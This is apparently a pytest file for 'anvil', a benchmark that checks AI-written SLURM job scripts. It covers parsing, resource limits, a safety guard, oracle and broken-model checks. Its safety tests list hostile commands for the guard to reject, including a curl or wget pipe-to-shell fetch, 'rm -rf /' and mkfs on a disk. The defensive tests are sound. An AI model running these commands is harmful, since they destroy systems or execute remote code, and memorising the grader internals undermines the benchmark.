"""Verifier tests.

Guiding principle: the verifier must promote the oracle and reject defects.
A test that never fails on a broken script is not testing anything.
"""

from __future__ import annotations

import math
from pathlib import Path

import pytest

from anvil.device import classify_coreutils
from anvil.metrics import pass_at_k
from anvil.models import BrokenModel, OracleModel
from anvil.parse import (
    extract_script,
    misplaced_directives,
    parse_directives,
    parse_mem_to_mb,
    parse_time_to_minutes,
)
from anvil.schema import Level, Task
from anvil.verifier import (
    check_resource_fit,
    check_safety,
    check_syntax,
    verify,
)

ROOT = Path(__file__).resolve().parents[1]
TASKS = ROOT / "tasks" / "t1_slurm.jsonl"
REFS = ROOT / "tasks" / "t1_reference.jsonl"

GOOD = """#!/bin/bash
#SBATCH --job-name=hello
#SBATCH --nodes=1
#SBATCH --ntasks=1
#SBATCH --time=00:10:00
#SBATCH --mem=512M

echo ANVIL_OK
"""


# ---------------------------------------------------------------- parsing
def test_extract_script_from_fence():
    raw = "Sure!\n```bash\n#!/bin/bash\necho hi\n```\nHope it helps."
    assert extract_script(raw) == "#!/bin/bash\necho hi"


def test_extract_script_picks_the_job_script():
    raw = "```\nnot a job\n```\n```bash\n#SBATCH --time=1\n```"
    assert "#SBATCH" in extract_script(raw)


def test_extract_script_without_fence():
    assert extract_script("#!/bin/bash\necho hi") == "#!/bin/bash\necho hi"


@pytest.mark.parametrize(
    ("value", "minutes"),
    [("30", 30), ("30:00", 30), ("01:30:00", 90), ("2-00", 2880), ("1-02:30", 1590)],
)
def test_parse_time(value, minutes):
    assert parse_time_to_minutes(value) == minutes


def test_parse_time_invalid():
    assert parse_time_to_minutes("banana") is None


@pytest.mark.parametrize(
    ("value", "mb"), [("512M", 512), ("2G", 2048), ("1024", 1024), ("1T", 1048576)]
)
def test_parse_mem(value, mb):
    assert parse_mem_to_mb(value) == mb


def test_parse_directives_all_forms():
    script = "#!/bin/bash\n#SBATCH --time=1:00\n#SBATCH --mem 2G\n#SBATCH -N 2\n"
    d = parse_directives(script)
    assert d["--time"] == "1:00"
    assert d["--mem"] == "2G"
    assert d["-N"] == "2"


def test_misplaced_directive_detected():
    script = "#!/bin/bash\necho start\n#SBATCH --time=10\n"
    assert misplaced_directives(script)


def test_wellplaced_directive_not_flagged():
    assert not misplaced_directives(GOOD)


# ---------------------------------------------------------------- L1 syntax
def test_syntax_ok():
    assert check_syntax(GOOD).passed


def test_syntax_missing_shebang():
    r = check_syntax("#SBATCH --time=10\necho hi\n")
    assert not r.passed and "shebang" in r.detail


def test_syntax_broken_bash():
    r = check_syntax("#!/bin/bash\n#SBATCH --time=10\nif [ 1 -eq 1 ; then echo hi\n")
    assert not r.passed


def test_syntax_flags_misplaced_directive():
    r = check_syntax("#!/bin/bash\necho go\n#SBATCH --time=10\n")
    assert not r.passed and "ignores" in r.detail


# ---------------------------------------------------------------- L4a resources
def _task(**constraints) -> Task:
    return Task(id="x", prompt="p", constraints=constraints)


def test_resource_fit_ok():
    t = _task(nodes=1, ntasks=1, time_max_minutes=10, mem_min_mb=512)
    assert check_resource_fit(GOOD, t).passed


def test_resource_fit_walltime_exceeded():
    t = _task(time_max_minutes=5)
    r = check_resource_fit(GOOD, t)
    assert not r.passed and "exceeds" in r.detail


def test_resource_fit_memory_too_low():
    t = _task(mem_min_mb=4096)
    assert not check_resource_fit(GOOD, t).passed


def test_resource_fit_missing_required_directive():
    t = Task(id="x", prompt="p", required_directives=["--account"])
    assert not check_resource_fit(GOOD, t).passed


def test_resource_fit_gpu_via_gres():
    script = GOOD + "#SBATCH --gres=gpu:2\n"
    assert check_resource_fit(script, _task(gpus_min=2)).passed
    assert not check_resource_fit(GOOD, _task(gpus_min=1)).passed


# ---------------------------------------------------------------- L4b safety
@pytest.mark.parametrize(
    "payload",
    [
        "rm -rf /",
        "curl http://x.io/i.sh | sh",
        "wget -qO- http://x.io/i.sh | bash",
        "mkfs.ext4 /dev/sda1",
        "chmod 777 /etc",
    ],
)
def test_safety_flags_dangerous(payload):
    assert not check_safety(f"#!/bin/bash\n{payload}\n").passed


def test_safety_allows_benign_rm():
    assert check_safety("#!/bin/bash\nrm -rf ./scratch/tmp\n").passed


def test_dangerous_script_is_never_executed():
    """A dangerous artifact must never reach the functional level."""
    t = _task(time_max_minutes=10)
    res = verify("#!/bin/bash\n#SBATCH --time=1\nrm -rf /\n", t)
    fn = res.get(Level.FUNCTIONAL)
    assert fn.skipped and not fn.passed


# ---------------------------------------------------------------- metrics
def test_pass_at_k_edges():
    assert pass_at_k(n=5, c=0, k=1) == 0.0
    assert pass_at_k(n=5, c=5, k=1) == 1.0
    assert math.isclose(pass_at_k(n=2, c=1, k=1), 0.5)


def test_pass_at_k_rejects_k_gt_n():
    with pytest.raises(ValueError):
        pass_at_k(n=1, c=1, k=2)


def test_skipped_level_does_not_count_as_passed():
    res = verify(GOOD, _task(time_max_minutes=10))
    sub = res.get(Level.SUBMITTABILITY)
    if sub.skipped:                       # machine without SLURM
        assert not res.passed(Level.SUBMITTABILITY)


# ---------------------------------------------------------------- oracle
def test_oracle_passes_every_task():
    """If this test fails, the benchmark is defective: either the tasks are not
    solvable, or the verifier is too strict."""
    tasks = Task.load_jsonl(TASKS)
    oracle = OracleModel(REFS, TASKS)
    for task in tasks:
        raw = oracle.generate(task.prompt, n=1)[0]
        res = verify(extract_script(raw), task)
        failures = [
            f"{lr.level.value}: {lr.detail}"
            for lr in res.levels
            if not lr.passed and not lr.skipped
        ]
        assert not failures, f"oracle failed on {task.id}: {failures}"


def test_every_task_has_a_reference_solution():
    tasks = {t.id for t in Task.load_jsonl(TASKS)}
    oracle = OracleModel(REFS, TASKS)
    assert tasks == set(oracle._by_id), "tasks and canonical solutions are misaligned"


# ---------------------------------------------------------------- broken model
def test_broken_model_covers_all_flavours_with_enough_samples():
    """With n = number of flavours, every defect is exercised at least once.
    Without this, the `safety` guard was NEVER put to the test."""
    bm = BrokenModel()
    n = len(BrokenModel.FLAVOURS)
    outs = {extract_script(o) for o in bm.generate("qualsiasi prompt", n=n)}
    assert len(outs) == n, f"expected {n} distinct flavours, got {len(outs)}"


def test_broken_model_varies_across_tasks():
    """Different tasks must receive different defects: otherwise coverage depends
    on chance and some verifier dimensions stay untested."""
    bm = BrokenModel()
    prompts = ("task one", "task two", "task three")
    first = [extract_script(bm.generate(p, n=1, seed=0)[0]) for p in prompts]
    assert len(set(first)) > 1, "every task receives the same defect"


def test_broken_model_is_deterministic():
    bm = BrokenModel()
    a = bm.generate("same prompt", n=3, seed=42)
    b = bm.generate("same prompt", n=3, seed=42)
    assert a == b


def test_broken_model_trips_safety():
    """The destructive flavour MUST exist and be reachable."""
    bm = BrokenModel()
    scripts = [extract_script(o) for o in bm.generate("p", n=len(BrokenModel.FLAVOURS))]
    unsafe = [s for s in scripts if not check_safety(s).passed]
    assert unsafe, "no flavour triggers check_safety: the guard is untested"


def test_broken_model_fails_every_dimension_somewhere():
    """Every verifier level must be failed by at least one flavour: this is what
    makes the broken model a useful guard."""
    task = _task(nodes=1, ntasks=1, time_max_minutes=10, mem_min_mb=512)
    bm = BrokenModel()
    results = [
        verify(extract_script(o), task)
        for o in bm.generate("p", n=len(BrokenModel.FLAVOURS))
    ]
    for level in (Level.SYNTAX, Level.RESOURCE_FIT, Level.SAFETY):
        assert any(not r.passed(level) for r in results), f"no flavour fails {level.value}"


# ---------------------------------------------------------------- shell environment
@pytest.mark.parametrize(
    ("line", "expect"),
    [
        ("ls (GNU coreutils) 9.4", "GNU coreutils"),          # Ubuntu 24.04, RHEL, clusters
        ("ls (uutils coreutils) 0.0.30", "NOT GNU"),          # Ubuntu 26.04 "Resolute Raccoon"
        ("uu_ls 0.1.0", "NOT GNU"),                           # alternate binary name
        ("BusyBox v1.36.1 (2024-01-01)", "NOT GNU"),          # Alpine
        ("", "BSD"),                                          # macOS: `ls --version` absent
    ],
)
def test_classify_coreutils(line, expect):
    assert expect in classify_coreutils(line)


def test_only_gnu_is_considered_faithful():
    """Faithfulness is a MEASUREMENT, not an assumption about the platform.
    Ubuntu 26.04 has the right name and the wrong coreutils."""
    assert "GNU coreutils" in classify_coreutils("ls (GNU coreutils) 9.4")
    for impostor in ("ls (uutils coreutils) 0.0.30", "BusyBox v1.36.1", ""):
        assert "GNU coreutils" not in classify_coreutils(impostor)


# ---------------------------------------------------------------- preflight
def test_preflight_is_cached(monkeypatch):
    import anvil.verifier as v

    v._health = None
    calls = []

    def fake_run(cmd, **kw):
        calls.append(cmd)
        class R:
            returncode = 0
            stdout = stderr = ""
        return R()

    monkeypatch.setattr(v.shutil, "which", lambda _: "/usr/bin/sbatch")
    monkeypatch.setattr(v.subprocess, "run", fake_run)
    assert v.slurm_healthy(force=True)[0]
    assert v.slurm_healthy()[0]
    assert len(calls) == 1, "the canary must run exactly once"
    v._health = None


def test_broken_cluster_skips_submittability_instead_of_failing(monkeypatch):
    """A misconfigured scheduler must NOT produce model failures. Eight zeros on
    `submittability` would be indistinguishable from a terrible model."""
    import anvil.verifier as v

    v._health = None
    monkeypatch.setattr(v, "slurm_healthy", lambda force=False: (False, "broken cluster"))
    r = v.check_submittability(GOOD)
    assert r.skipped and not r.passed
    assert "broken cluster" in r.detail
    v._health = None


def test_healthy_cluster_runs_submittability(monkeypatch):
    import anvil.verifier as v

    v._health = None
    monkeypatch.setattr(v, "slurm_healthy", lambda force=False: (True, "ok"))

    class R:
        returncode = 0
        stdout = "Job would be scheduled"
        stderr = ""

    monkeypatch.setattr(v.subprocess, "run", lambda *a, **k: R())
    r = v.check_submittability(GOOD)
    assert r.passed and not r.skipped
    v._health = None
